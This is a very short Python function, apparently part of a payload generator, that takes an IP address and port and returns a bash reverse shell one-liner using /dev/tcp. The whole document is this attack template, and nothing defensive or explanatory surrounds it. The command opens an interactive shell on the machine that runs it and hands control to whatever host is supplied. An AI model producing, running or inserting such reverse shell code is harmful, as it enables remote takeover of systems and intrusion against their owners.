def generate(ip, port):
    shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return shell
